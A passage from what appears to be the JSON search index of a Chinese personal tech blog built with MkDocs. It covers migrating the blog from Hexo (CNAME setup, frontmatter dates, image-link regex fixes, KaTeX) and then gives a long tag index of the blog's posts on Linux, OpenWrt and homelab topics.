\u9700\u8981\u4fee\u6539\u5176\u4e2dpip install\u547d\u4ee4\uff0c\u8865\u5145\u5b8c\u4f9d\u8d56</p>","tags":["hexo","mkdocs","cloudfare","obsidian"]},{"location":"%E6%8A%98%E8%85%BE/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#\u914d\u7f6ecustom-domain","title":"\u914d\u7f6ecustom domain","text":"<p>Under \"Custom domain\", type your custom domain, then click\u00a0Save. If you are publishing your site from a branch, this will create a commit that adds a\u00a0<code>CNAME</code>\u00a0file directly to the root of your source branch. If you are publishing your site with a custom GitHub Actions workflow, no\u00a0<code>CNAME</code>\u00a0file is created.</p> <p>\u914d\u7f6ecustom domain - \u57df\u540d\u89e3\u6790\u670d\u52a1\u63d0\u4f9b\u5546\uff1a\u6dfb\u52a0\u4e00\u6761CNAME record\uff0c\u6307\u5411user.github.io - github   - \u5bf9\u4e8esource\u4e3adeploy from a branch\uff0c\u5728<code>/</code>\u8def\u5f84\u6dfb\u52a0CNAME\u6587\u4ef6\uff0c\u5305\u542bCNAME\u540d\uff08\u901a\u8fc7setting\u4e2d\u8bbe\u7f6e\uff0c\u4e5f\u4f1a\u81ea\u52a8\u521b\u5efa\u8be5CNAME\u6587\u4ef6\uff09   - \u5bf9\u4e8esource\u4e3agithub action\uff0c\u901a\u8fc7setting\u8bbe\u7f6e\u5373\u53ef\uff0c\u4e0d\u4f1a\u521b\u5efaCNAME\u6587\u4ef6 \u5982\u679c\u5df2\u7ecf\u521b\u5efa\u8fc7user\u6216organization site\uff0c\u5219\u521b\u5efaproject site\u65f6\u4f1a\u81ea\u52a8\u4f7f\u7528\u4e4b\u524d\u7684\u57df\u540d</p>","tags":["hexo","mkdocs","cloudfare","obsidian"]},{"location":"%E6%8A%98%E8%85%BE/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#markdown\u683c\u5f0f\u4fee\u590d","title":"markdown\u683c\u5f0f\u4fee\u590d","text":"<p>\u539f\u672c\u5199\u7684markdown\u6587\u4ef6\u6709\u4e00\u4e9b\u683c\u5f0f\u4e0d\u592a\u89c4\u8303\uff0c\u5207\u6362\u6210mkdocs\u540e\uff0c\u6709\u8bb8\u591a\u62a5\u9519\u4fe1\u606f\u3002\u4ee5\u4e0b\u5217\u51fa\u5176\u4e2d\u4e00\u4e9b\u95ee\u9898\uff0c\u5e76\u4e14\u63d0\u4f9b\u4e00\u4e2a\u81ea\u52a8\u4fee\u590d\u811a\u672cfix_markdown.py\uff0c\u907f\u514d\u4e00\u4e9b\u67af\u71e5\u7684\u624b\u52a8\u4fee\u6539\u3002</p>","tags":["hexo","mkdocs","cloudfare","obsidian"]},{"location":"%E6%8A%98%E8%85%BE/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#metadata","title":"metadata","text":"<p>markdown\u5f00\u5934\u90e8\u5206\u53ef\u4ee5\u5b9a\u4e49\u4e00\u4e9b\u5143\u6570\u636e\uff0c\u5982\u4f5c\u8005\uff0c\u65e5\u671f\u7b49\uff0c\u8fd9\u90e8\u5206\u53eb\u505afrontmatter\u3002\u901a\u5e38\u91c7\u7528yaml\u683c\u5f0f\u3002</p> <p>\u65e5\u671f\u53ea\u80fd\u4f7f\u7528<code>YY-mm-dd</code>\u6216\u8005<code>YY-mm-dd HH:MM:SS</code>\uff0c\u50cf<code>2023-04-20 16:22</code>\u8fd9\u6837\u7684\u683c\u5f0f\u662f\u65e0\u6cd5\u8bc6\u522b\u7684 <pre><code>ERROR   -  Error reading metadata 'date' of post 'blog/posts/2023-04-20-\u5177\u4f53\u6570\u5b66.md' in 'docs':\n           Expected type: &lt;class 'datetime.date'&gt; or &lt;class 'datetime.datetime'&gt; but received: &lt;class 'str'&gt;\n</code></pre> \u811a\u672c\u652f\u6301\u4fee\u590d\u8be5\u95ee\u9898\u3002</p> <p>\u6211\u4f7f\u7528obsidian\u7684Template\u529f\u80fd\u6765\u81ea\u52a8\u751f\u6210metadata\uff0c\u5176\u9ed8\u8ba4\u751f\u6210\u7684\u65f6\u95f4\u683c\u5f0f\u662f\u4e0d\u5e26\u79d2\u7684\u65f6\u95f4\u683c\u5f0f\uff0c\u56e0\u800c\u5bfc\u81f4\u4e86\u4ee5\u4e0a\u95ee\u9898\u3002 \u53ef\u4ee5\u81ea\u5b9a\u4e49\u5176\u6a21\u677f\u65f6\u95f4\u683c\u5f0f\uff1aTemplates - Obsidian Help \u4fee\u6b63\u540e\u6a21\u677f\u5982\u4e0b\uff1a <pre><code>---\ntitle: {{title}}\ndate: {{date}} {{time:HH:mm:ss}}\ntags:\n- linux\ncategories:\n- \u6298\u817e\n---\n\n&lt;!-- more --&gt;\n</code></pre></p>","tags":["hexo","mkdocs","cloudfare","obsidian"]},{"location":"%E6%8A%98%E8%85%BE/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#\u56fe\u7247\u94fe\u63a5","title":"\u56fe\u7247\u94fe\u63a5","text":"<p>\u539f\u672c\u4f7f\u7528\u4e86\u4e24\u79cd\u683c\u5f0f<code>/images/xxx/xxx.png</code>, <code>images/xxx/xxx.png</code>\u7684\u56fe\u7247\u94fe\u63a5\uff0c\u5bfc\u81f4\u62a5\u9519 <pre><code>Doc file 'blog/posts/2023-04-20-\u5177\u4f53\u6570\u5b66.md' contains a relative link 'images/\u5177\u4f53\u6570\u5b66/image-20220607171500766.png', but the target\n           'blog/posts/images/\u5177\u4f53\u6570\u5b66/image-20220607171500766.png' is not found among documentation files\n</code></pre></p> <p>mkdocs\u6240\u6709\u94fe\u63a5\u5747\u4f7f\u7528\u76f8\u5bf9\u8def\u5f84\uff0c\u6539\u4e3a\u76f8\u5bf9\u4e8emd\u6587\u4ef6\u7684\u8def\u5f84\u5373\u53ef\u3002 p.s \u8fd9\u91cc\u4e0d\u5f97\u4e0d\u63d0\u4e0bobsidian\u7684\u65b9\u4fbf\u4e4b\u5904\u4e86\u3002obsidian\u91c7\u7528\u4e86\u5c3d\u53ef\u80fd\u5339\u914d\u7684\u539f\u5219\uff0c\u56e0\u6b64\u53ea\u8981\u6587\u4ef6\u540d\u76f8\u540c\uff0c\u65e0\u8bba\u4f4d\u4e8e\u54ea\u4e2a\u76ee\u5f55\u4e0b\uff0c\u5747\u80fd\u6b63\u786e\u5339\u914d</p> <p>\u4f7f\u7528\u6b63\u5219\u4fee\u6539\u5173\u952e\u4ee3\u7801\u5982\u4e0b <pre><code>RE = fr'!\\[(.*?)\\]\\(/{old_prefix}(.*?)\\)'   # old_prefix = images/\nm1 = re.findall(RE, content)\nif m1:\n  content = re.sub(RE, f'![\\g&lt;1&gt;]({new_prefix}\\g&lt;2&gt;)', content)\n</code></pre></p>","tags":["hexo","mkdocs","cloudfare","obsidian"]},{"location":"%E6%8A%98%E8%85%BE/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#\u5185\u90e8\u94fe\u63a5","title":"\u5185\u90e8\u94fe\u63a5","text":"<p>Setting up a blog - Material for MkDocs (squidfunk.github.io)</p> <p>mkdocs\u4f7f\u7528\u76f8\u5bf9\u8def\u5f84\uff0c\u6307\u5411\u5f15\u7528\u7684md\u6587\u4ef6\uff0c\u5e76\u4e14\u4e5f\u652f\u6301\u4f7f\u7528<code>#</code>\u5b9a\u4f4d\u5230\u7279\u5b9asection\u3002\u539f\u672chexo\u7684\u94fe\u63a5\u683c\u5f0f\u5219\u590d\u6742\u591a\u4e86\u3002 \u7531\u4e8e\u6570\u76ee\u4e0d\u591a\uff0c\u624b\u52a8\u4fee\u6539\u5373\u53ef\u3002 <pre><code>[openwrt\u914d\u7f6e#ipv6](2022-02-13-openwrt\u914d\u7f6e.md#ipv6)\n</code></pre></p> <p>p.s obsidan\u540c\u6837\u652f\u6301\u5b9a\u4f4d\u5230\u53e6\u4e00\u4e2amarkdown\u6587\u6863\uff0c\u5e76\u4e14\u4e0d\u7528\u592a\u5728\u610f\u8def\u5f84</p>","tags":["hexo","mkdocs","cloudfare","obsidian"]},{"location":"%E6%8A%98%E8%85%BE/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#\u6570\u5b66\u516c\u5f0f","title":"\u6570\u5b66\u516c\u5f0f","text":"<p>Math - Material for MkDocs (squidfunk.github.io) \u6709MathJax\u548cKaTex\u4e24\u4e2a\u9009\u62e9 - Speed: KaTeX is generally faster than MathJax. If your site requires rendering large quantities of complex equations quickly, KaTeX may be the better choice. - Syntax Support: MathJax supports a wider array of LaTeX commands and can process a variety of mathematical markup languages (like AsciiMath and MathML). If you need advanced LaTeX features, MathJax may be more suitable.</p> <p>\u4f46\u662f\u4f7f\u7528\u4e24\u79cd\u65b9\u6848\uff0c\u636e\u65e0\u6cd5\u6b63\u786e\u663e\u793a\u6211\u7684\u5177\u4f53\u6570\u5b66\u90a3\u7bc7\u6587\u7ae0\u7684\u6240\u6709\u6570\u5b66\u516c\u5f0f\uff0c\u5e76\u4e14MathJax\u6b63\u786e\u8bc6\u522b\u7684\u66f4\u5c11\u3002\u56e0\u6b64\u6700\u540e\u9009\u7528\u4e86KaTeX</p>","tags":["hexo","mkdocs","cloudfare","obsidian"]},{"location":"archive/2024/","title":"2024","text":""},{"location":"archive/2023/","title":"2023","text":""},{"location":"archive/2022/","title":"2022","text":""},{"location":"archive/2021/","title":"2021","text":""},{"location":"archive/2020/","title":"2020","text":""},{"location":"archive/2019/","title":"2019","text":""},{"location":"category/%E5%B7%A5%E5%85%B7/","title":"\u5de5\u5177","text":""},{"location":"category/%E6%8A%98%E8%85%BE/","title":"\u6298\u817e","text":""},{"location":"category/%E5%8D%9A%E5%AE%A2/","title":"\u535a\u5ba2","text":""},{"location":"category/homelab/","title":"homelab","text":""},{"location":"category/%E8%99%9A%E6%8B%9F%E5%8C%96/","title":"\u865a\u62df\u5316","text":""},{"location":"category/%E6%9D%82%E6%96%87/","title":"\u6742\u6587","text":""},{"location":"category/%E8%AE%BE%E5%A4%87/","title":"\u8bbe\u5907","text":""},{"location":"category/%E8%AF%BE%E7%A8%8B/","title":"\u8bfe\u7a0b","text":""},{"location":"category/%E5%AD%A6%E4%B9%A0/","title":"\u5b66\u4e60","text":""},{"location":"category/%E7%BC%96%E7%A8%8B/","title":"\u7f16\u7a0b","text":""},{"location":"category/%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/","title":"\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531","text":""},{"location":"category/%E9%98%85%E8%AF%BB/","title":"\u9605\u8bfb","text":""},{"location":"category/%E4%B8%AA%E4%BA%BA/","title":"\u4e2a\u4eba","text":""},{"location":"page/2/","title":"\u535a\u5ba2","text":""},{"location":"page/3/","title":"\u535a\u5ba2","text":""},{"location":"page/4/","title":"\u535a\u5ba2","text":""},{"location":"archive/2022/page/2/","title":"2022","text":""},{"location":"category/%E6%8A%98%E8%85%BE/page/2/","title":"\u6298\u817e","text":""},{"location":"tags/","title":"\u6807\u7b7e","text":""},{"location":"tags/#asc","title":"ASC","text":"<ul> <li>Vacation routine: ASC2020 tips (up to 02/09)</li> </ul>"},{"location":"tags/#c","title":"C","text":"<ul> <li>C\u7f16\u7a0b\u98ce\u683c\u89c4\u8303</li> <li>C&amp;C++</li> </ul>"},{"location":"tags/#c_1","title":"C++","text":"<ul> <li>C&amp;C++</li> </ul>"},{"location":"tags/#ci","title":"CI","text":"<ul> <li>github action\u7f16\u8bd1openwrt</li> </ul>"},{"location":"tags/#eeprom","title":"EEPROM","text":"<ul> <li>\u8bb0\u4e00\u6b21\u8def\u7531\u5668\u5237\u51fa\u95ee\u9898\u4fee\u590d\u8fc7\u7a0b</li> </ul>"},{"location":"tags/#kvm","title":"KVM","text":"<ul> <li>\u53f0\u5f0f\u673a\u6539\u9020\u8ba1\u5212</li> <li>libvirt</li> <li>\u6361\u5783\u573e-rk3399 DIY KVM</li> </ul>"},{"location":"tags/#lxd","title":"LXD","text":"<ul> <li>\u53f0\u5f0f\u673a\u6539\u9020\u8ba1\u5212</li> </ul>"},{"location":"tags/#vipt","title":"VIPT","text":"<ul> <li>\u518d\u6b21\u7406\u89e3Cache\u8bbe\u8ba1</li> </ul>"},{"location":"tags/#x11","title":"X11","text":"<ul> <li>vnc\u548crdp\u8fdc\u7a0b</li> </ul>"},{"location":"tags/#ac2100","title":"ac2100","text":"<ul> <li>\u8bb0\u5f55\u7ea2\u7c73AC2100\u6298\u817e</li> </ul>"},{"location":"tags/#armbian","title":"armbian","text":"<ul> <li>\u6361\u5783\u573e-rk3399 DIY KVM</li> </ul>"},{"location":"tags/#arp","title":"arp","text":"<ul> <li>NAS\u65e0\u6cd5\u626b\u63cf\u5230\u6d89\u53ca\u7684\u7f51\u7edc\u77e5\u8bc6</li> </ul>"},{"location":"tags/#awk","title":"awk","text":"<ul> <li>linux\u76f8\u5173</li> </ul>"},{"location":"tags/#bad-apple","title":"bad-apple","text":"<ul> <li>CloudView\u5e73\u53f0\u8fd0\u884cbad apple</li> </ul>"},{"location":"tags/#bash","title":"bash","text":"<ul> <li>bash</li> </ul>"},{"location":"tags/#breed","title":"breed","text":"<ul> <li>\u8bb0\u4e00\u6b21\u8def\u7531\u5668\u5237\u51fa\u95ee\u9898\u4fee\u590d\u8fc7\u7a0b</li> </ul>"},{"location":"tags/#bridge","title":"bridge","text":"<ul> <li>VLAN\u5b9e\u73b0\u5355\u7f51\u53e3\u8f6f\u8def\u7531</li> </ul>"},{"location":"tags/#cache","title":"cache","text":"<ul> <li>\u518d\u6b21\u7406\u89e3Cache\u8bbe\u8ba1</li> </ul>"},{"location":"tags/#centos","title":"centos","text":"<ul> <li>\u5b89\u88c5centos\u865a\u62df\u673a\u4ee5\u53ca\u914d\u7f6egameboy.live\u8bb0\u5f55</li> </ul>"},{"location":"tags/#clock","title":"clock","text":"<ul> <li>linux\u65f6\u949f\u4ecb\u7ecd</li> </ul>"},{"location":"tags/#cloudfare","title":"cloudfare","text":"<ul> <li>hexo\u8fc1\u79fb\u5230mkdoc</li> </ul>"},{"location":"tags/#cloudview","title":"cloudview","text":"<ul> <li>CloudView\u5e73\u53f0\u8fd0\u884cbad apple</li> </ul>"},{"location":"tags/#cpp","title":"cpp","text":"<ul> <li>Use dlib in C++</li> </ul>"},{"location":"tags/#cpu","title":"cpu","text":"<ul> <li>\u518d\u6b21\u7406\u89e3Cache\u8bbe\u8ba1</li> </ul>"},{"location":"tags/#cuda","title":"cuda","text":"<ul> <li>CUDA\u4f18\u5316</li> <li>CUDA\u67b6\u6784</li> <li>CUDA\u7f16\u7a0b&amp;\u5de5\u5177</li> </ul>"},{"location":"tags/#div10","title":"div10","text":"<ul> <li>\u4f7f\u7528\u6574\u6570\u4f4d\u8fd0\u7b97\u8ba1\u7b97div10</li> </ul>"},{"location":"tags/#dlib","title":"dlib","text":"<ul> <li>Use dlib in C++</li> </ul>"},{"location":"tags/#dns","title":"dns","text":"<ul> <li>openwrt DNS\u8be6\u89e3</li> </ul>"},{"location":"tags/#docker","title":"docker","text":"<ul> <li>\u4f7f\u7528docker\u914d\u7f6ehexo\u535a\u5ba2\u73af\u5883</li> <li>\u53f0\u5f0f\u673a\u6539\u9020\u8ba1\u5212</li> <li>docker</li> </ul>"},{"location":"tags/#fdisk","title":"fdisk","text":"<ul> <li>linux\u76f8\u5173</li> </ul>"},{"location":"tags/#ffmpeg","title":"ffmpeg","text":"<ul> <li>ffmpeg</li> </ul>"},{"location":"tags/#flash\u5206\u533a","title":"flash\u5206\u533a","text":"<ul> <li>\u8bb0\u4e00\u6b21\u8def\u7531\u5668\u5237\u51fa\u95ee\u9898\u4fee\u590d\u8fc7\u7a0b</li> </ul>"},{"location":"tags/#fsck","title":"fsck","text":"<ul> <li>\u8bb0\u4e00\u6b21linux\u7cfb\u7edf\u65e0\u6cd5\u542f\u52a8\u4fee\u590d\u8fc7\u7a0b</li> </ul>"},{"location":"tags/#fstab","title":"fstab","text":"<ul> <li>linux\u7cfb\u7edf\u8fc1\u79fb</li> </ul>"},{"location":"tags/#fzf","title":"fzf","text":"<ul> <li>\u5b89\u88c5linux\u540e\u7684\u914d\u7f6e</li> </ul>"},{"location":"tags/#gameboy","title":"gameboy","text":"<ul> <li>\u5b89\u88c5centos\u865a\u62df\u673a\u4ee5\u53ca\u914d\u7f6egameboy.live\u8bb0\u5f55</li> </ul>"},{"location":"tags/#gcc","title":"gcc","text":"<ul> <li>Linux\u5b89\u88c5windows\u865a\u62df\u673a\u5e76\u663e\u5361\u76f4\u901a</li> <li>gcc mpi\u6e90\u7801\u7f16\u8bd1</li> </ul>"},{"location":"tags/#git","title":"git","text":"<ul> <li>git</li> </ul>"},{"location":"tags/#github-action","title":"github-action","text":"<ul> <li>github action\u7f16\u8bd1openwrt</li> </ul>"},{"location":"tags/#grub","title":"grub","text":"<ul> <li>linux\u7cfb\u7edf\u8fc1\u79fb</li> <li>\u8bb0\u4e00\u6b21linux\u7cfb\u7edf\u65e0\u6cd5\u542f\u52a8\u4fee\u590d\u8fc7\u7a0b</li> </ul>"},{"location":"tags/#hexo","title":"hexo","text":"<ul> <li>write blog in PC through sshing to a mobile phone</li> <li>\u4f7f\u7528docker\u914d\u7f6ehexo\u535a\u5ba2\u73af\u5883</li> <li>hexo\u4f7f\u7528</li> <li>hexo\u8fc1\u79fb\u5230mkdoc</li> </ul>"},{"location":"tags/#hpl","title":"hpl","text":"<ul> <li>HPL complie</li> </ul>"},{"location":"tags/#immortalwrt","title":"immortalwrt","text":"<ul> <li>\u5c1d\u8bd5\u975e\u5b98\u65b9openwrt</li> </ul>"},{"location":"tags/#ip-rule","title":"ip-rule","text":"<ul> <li>Wireguard\u7ec4\u7f51</li> </ul>"},{"location":"tags/#iptables","title":"iptables","text":"<ul> <li>iptables</li> <li>Wireguard\u7ec4\u7f51</li> </ul>"},{"location":"tags/#ipv6","title":"ipv6","text":"<ul> <li>\u79fb\u52a8\u5149\u732b\u5f00\u542fipv6</li> <li>openwrt DNS\u8be6\u89e3</li> </ul>"},{"location":"tags/#iscsi","title":"iscsi","text":"<ul> <li>\u7f51\u7edc\u6302\u8f7d\u78c1\u76d8(iSCSi)</li> </ul>"},{"location":"tags/#jellyfin","title":"jellyfin","text":"<ul> <li>jellyfin\u76f8\u5173</li> </ul>"},{"location":"tags/#kernel","title":"kernel","text":"<ul> <li>linux\u5185\u6838\u8bbe\u8ba1\u4e0e\u5b9e\u73b0\u9605\u8bfb</li> </ul>"},{"location":"tags/#latex","title":"latex","text":"<ul> <li>latex\u5b57\u4f53\u5206\u7c7b</li> <li>latex</li> </ul>"},{"location":"tags/#libvirt","title":"libvirt","text":"<ul> <li>libvirt</li> </ul>"},{"location":"tags/#linux","title":"linux","text":"<ul> <li>\u5b89\u88c5linux\u540e\u7684\u914d\u7f6e</li> <li>\u8bb0\u4e00\u6b21linux\u7cfb\u7edf\u65e0\u6cd5\u542f\u52a8\u4fee\u590d\u8fc7\u7a0b</li> </ul>"},{"location":"tags/#linuxdeploy","title":"linuxdeploy","text":"<ul> <li>\u5b89\u5353\u5237\u673a\u5e76\u5b89\u88c5linux</li> </ul>"},{"location":"tags/#lxc","title":"lxc","text":"<ul> <li>LXC\u4f7f\u7528</li> </ul>"},{"location":"tags/#lxd_1","title":"lxd","text":"<ul> <li>LXC\u4f7f\u7528</li> </ul>"},{"location":"tags/#m2\u63a5\u53e3","title":"m2\u63a5\u53e3","text":"<ul> <li>\u66f4\u65b0\u56fa\u6001\u4e4b\u65c5</li> </ul>"},{"location":"tags/#math","title":"math","text":"<ul> <li>\u5177\u4f53\u6570\u5b66</li> </ul>"},{"location":"tags/#mesh","title":"mesh","text":"<ul> <li>Openwrt Mesh\u548c\u5feb\u901f\u6f2b\u6e38\u914d\u7f6e</li> </ul>"},{"location":"tags/#mips","title":"mips","text":"<ul> <li>mips\u975e\u5bf9\u9f50\u6307\u4ee4\u4e0e\u5927\u5c0f\u7aef</li> <li>ucore-mips \u4ee3\u7801\u5206\u6790</li> </ul>"},{"location":"tags/#mkdocs","title":"mkdocs","text":"<ul> <li>hexo\u8fc1\u79fb\u5230mkdoc</li> </ul>"},{"location":"tags/#mount","title":"mount","text":"<ul> <li>linux\u76f8\u5173</li> </ul>"},{"location":"tags/#mpi","title":"mpi","text":"<ul> <li>Linux\u5b89\u88c5windows\u865a\u62df\u673a\u5e76\u663e\u5361\u76f4\u901a</li> <li>gcc mpi\u6e90\u7801\u7f16\u8bd1</li> </ul>"},{"location":"tags/#novnc","title":"noVNC","text":"<ul> <li>vnc\u548crdp\u8fdc\u7a0b</li> </ul>"},{"location":"tags/#ntfs","title":"ntfs","text":"<ul> <li>\u53f0\u5f0f\u673a\u6539\u9020\u8ba1\u5212</li> </ul>"},{"location":"tags/#obsidian","title":"obsidian","text":"<ul> <li>hexo\u8fc1\u79fb\u5230mkdoc</li> </ul>"},{"location":"tags/#opencv","title":"opencv","text":"<ul> <li>\u5b89\u88c5\u4f7f\u7528OpenCV(windows)</li> </ul>"},{"location":"tags/#openwrt","title":"openwrt","text":"<ul> <li>Openwrt\u6298\u817e</li> <li>\u8bb0\u4e00\u6b21\u8def\u7531\u5668\u5237\u51fa\u95ee\u9898\u4fee\u590d\u8fc7\u7a0b</li> <li>openwrt\u5237\u673a</li> <li>openwrt\u7f16\u8bd1</li> <li>openwrt\u914d\u7f6e</li> <li>openwrt DNS\u8be6\u89e3</li> <li>\u4f7f\u7528openwrt\u8def\u7531\u5668\u548cusb\u6444\u50cf\u5934\u8fdb\u884c\u5ef6\u65f6\u6444\u5f71</li> <li>Openwrt Mesh\u548c\u5feb\u901f\u6f2b\u6e38\u914d\u7f6e</li> <li>\u5c1d\u8bd5\u975e\u5b98\u65b9openwrt</li> <li>Wireguard\u7ec4\u7f51</li> <li>VLAN\u5b9e\u73b0\u5355\u7f51\u53e3\u8f6f\u8def\u7531</li> <li>github action\u7f16\u8bd1openwrt</li> <li>openwrt x86\u5347\u7ea7</li> </ul>"},{"location":"tags/#overleaf","title":"overleaf","text":"<ul> <li>\u5728\u865a\u62df\u673a\u4e0a\u642d\u5efaoverleaf</li> </ul>"},{"location":"tags/#parted","title":"parted","text":"<ul> <li>linux\u76f8\u5173</li> </ul>"},{"location":"tags/#portainer","title":"portainer","text":"<ul> <li>\u53f0\u5f0f\u673a\u6539\u9020\u8ba1\u5212</li> </ul>"},{"location":"tags/#pve","title":"pve","text":"<ul> <li>PVE</li> </ul>"},{"location":"tags/#python","title":"python","text":"<ul> <li>python\u6b63\u5219\u8868\u8fbe\u5f0f</li> </ul>"},{"location":"tags/#qemu","title":"qemu","text":"<ul> <li>\u865a\u62df\u6e38\u620f\u623f</li> <li>libvirt</li> </ul>"},{"location":"tags/#rdp","title":"rdp","text":"<ul> <li>vnc\u548crdp\u8fdc\u7a0b</li> </ul>"},{"location":"tags/#re","title":"re","text":"<ul> <li>python\u6b63\u5219\u8868\u8fbe\u5f0f</li> </ul>"},{"location":"tags/#retroarch","title":"retroarch","text":"<ul> <li>retroarch\u914d\u7f6e</li> </ul>"},{"location":"tags/#risc-v","title":"risc-v","text":"<ul> <li>RISC-V trend</li> </ul>"},{"location":"tags/#rk3399","title":"rk3399","text":"<ul> <li>\u6361\u5783\u573e-rk3399 DIY KVM</li> </ul>"},{"location":"tags/#rsync","title":"rsync","text":"<ul> <li>linux\u7cfb\u7edf\u8fc1\u79fb</li> </ul>"},{"location":"tags/#rtc","title":"rtc","text":"<ul> <li>linux\u65f6\u949f\u4ecb\u7ecd</li> </ul>"},{"location":"tags/#samba","title":"samba","text":"<ul> <li>\u53f0\u5f0f\u673a\u6539\u9020\u8ba1\u5212</li> </ul>"},{"location":"tags/#sed","title":"sed","text":"<ul> <li>linux\u76f8\u5173</li> </ul>"},{"location":"tags/#style","title":"style","text":"<ul> <li>C\u7f16\u7a0b\u98ce\u683c\u89c4\u8303</li> </ul>"},{"location":"tags/#termux","title":"termux","text":"<ul> <li>write blog in PC through sshing to a mobile phone</li> </ul>"},{"location":"tags/#tigervnc","title":"tigervnc","text":"<ul> <li>vnc\u548crdp\u8fdc\u7a0b</li> </ul>"},{"location":"tags/#time","title":"time","text":"<ul> <li>linux\u65f6\u949f\u4ecb\u7ecd</li> </ul>"},{"location":"tags/#tmux","title":"tmux","text":"<ul> <li>\u5b89\u88c5linux\u540e\u7684\u914d\u7f6e</li> <li>tmux</li> </ul>"},{"location":"tags/#tty","title":"tty","text":"<ul> <li>linux\u76f8\u5173</li> </ul>"},{"location":"tags/#ucore","title":"ucore","text":"<ul> <li>ucore lab2\u603b\u7ed3</li> <li>ucore lab3 \u603b\u7ed3</li> <li>ucore-mips \u4ee3\u7801\u5206\u6790</li> </ul>"},{"location":"tags/#usb\u6444\u50cf\u5934","title":"usb\u6444\u50cf\u5934","text":"<ul> <li>\u4f7f\u7528openwrt\u8def\u7531\u5668\u548cusb\u6444\u50cf\u5934\u8fdb\u884c\u5ef6\u65f6\u6444\u5f71</li> </ul>"},{"location":"tags/#virsh","title":"virsh","text":"<ul> <li>libvirt</li> </ul>"},{"location":"tags/#virtualbox","title":"virtualbox","text":"<ul> <li>Virtual Box\u914d\u7f6e\u53cc\u7f51\u5361</li> <li>linux\u76f8\u5173</li> </ul>"},{"location":"tags/#vlan","title":"vlan","text":"<ul> <li>VLAN\u5b9e\u73b0\u5355\u7f51\u53e3\u8f6f\u8def\u7531</li> </ul>"},{"location":"tags/#vnc","title":"vnc","text":"<ul> <li>\u5b89\u88c5linux\u540e\u7684\u914d\u7f6e</li> <li>vnc\u548crdp\u8fdc\u7a0b</li> </ul>"},{"location":"tags/#wifi","title":"wifi","text":"<ul> <li>linux\u76f8\u5173</li> </ul>"},{"location":"tags/#windows","title":"windows","text":"<ul> <li>windows\u91cd\u88c5\u7cfb\u7edf\u6b65\u9aa4</li> <li>windows\u76f8\u5173</li> </ul>"},{"location":"tags/#wireguard","title":"wireguard","text":"<ul> <li>\u5b9e\u9a8c\u5ba4\u7f51\u7edc\u98ce\u6ce2</li> <li>Wireguard\u7ec4\u7f51</li> </ul>"},{"location":"tags/#wsl","title":"wsl","text":"<ul> <li>WSL\u8bb0\u5f55</li> </ul>"},{"location":"tags/#x11vnc","title":"x11vnc","text":"<ul> <li>vnc\u548crdp\u8fdc\u7a0b</li> </ul>"},{"location":"tags/#x86","title":"x86","text":"<ul> <li>\u8bfbx86\u624b\u518c\u8bb0\u5f55</li> <li>x86\u8bb0\u5f55</li> </ul>"},{"location":"tags/#zsh","title":"zsh","text":"<ul> <li>\u5b89\u88c5linux\u540e\u7684\u914d\u7f6e</li> </ul>"},{"location":"tags/#\u4e95\u5b57\u68cb","title":"\u4e95\u5b57\u68cb","text":"<ul> <li>\u4e95\u5b57\u68cb\u4e0e\u6700\u5927\u6700\u5c0f\u503c\u7b97\u6cd5</li> </ul>"},{"location":"tags/#\u4f4d\u64cd\u4f5c","title":"\u4f4d\u64cd\u4f5c","text":"<ul> <li>ARM\u76f8\u5173</li> </ul>"},{"location":"tags/#\u4f4d\u8fd0\u7b97","title":"\u4f4d\u8fd0\u7b97","text":"<ul> <li>\u4f7f\u7528\u6574\u6570\u4f4d\u8fd0\u7b97\u8ba1\u7b97div10</li> </ul>"},{"location":"tags/#\u4fdd\u7814","title":"\u4fdd\u7814","text":"<ul> <li>\u8bb0\u5f55\u4e00\u6b21\u5931\u7720</li> </ul>"},{"location":"tags/#\u5177\u4f53\u6570\u5b66","title":"\u5177\u4f53\u6570\u5b66","text":"<ul> <li>\u5177\u4f53\u6570\u5b66</li> </ul>"},{"location":"tags/#\u5185\u7f51\u7a7f\u900f","title":"\u5185\u7f51\u7a7f\u900f","text":"<ul> <li>\u4e0d\u540c\u60c5\u51b5\u4e0b\u7684\u5185\u7f51\u7a7f\u900f</li> </ul>"},{"location":"tags/#\u5237\u673a","title":"\u5237\u673a","text":"<ul> <li>\u5b89\u5353\u5237\u673a\u5e76\u5b89\u88c5linux</li> </ul>"},{"location":"tags/#\u526a\u679d","title":"\u526a\u679d","text":"<ul> <li>\u4e95\u5b57\u68cb\u4e0e\u6700\u5927\u6700\u5c0f\u503c\u7b97\u6cd5</li> </ul>"},{"location":"tags/#\u5927\u5c0f\u7aef","title":"\u5927\u5c0f\u7aef","text":"<ul> <li>mips\u975e\u5bf9\u9f50\u6307\u4ee4\u4e0e\u5927\u5c0f\u7aef</li> </ul>"},{"location":"tags/#\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531","title":"\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531","text":"<ul> <li>\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531</li> </ul>"},{"location":"tags/#\u5b57\u4f53","title":"\u5b57\u4f53","text":"<ul> <li>\u5b57\u4f53\u5206\u7c7b</li> </ul>"},{"location":"tags/#\u5d4c\u5165\u5f0f","title":"\u5d4c\u5165\u5f0f","text":"<ul> <li>\u5d4c\u5165\u5f0f\u6280\u672f\u4e0e\u5b9e\u8df5</li> </ul>"},{"location":"tags/#\u5e74\u5ea6\u603b\u7ed3","title":"\u5e74\u5ea6\u603b\u7ed3","text":"<ul> <li>\u5173\u4e8e2020\u5230\u76ee\u524d\u7684\u4e00\u4e2a\u603b\u7ed3</li> </ul>"},{"location":"tags/#\u5e8f\u7ae0","title":"\u5e8f\u7ae0","text":"<ul> <li>\u5e8f\u7ae0</li> </ul>"},{"location":"tags/#\u5ef6\u65f6\u6444\u5f71","title":"\u5ef6\u65f6\u6444\u5f71","text":"<ul> 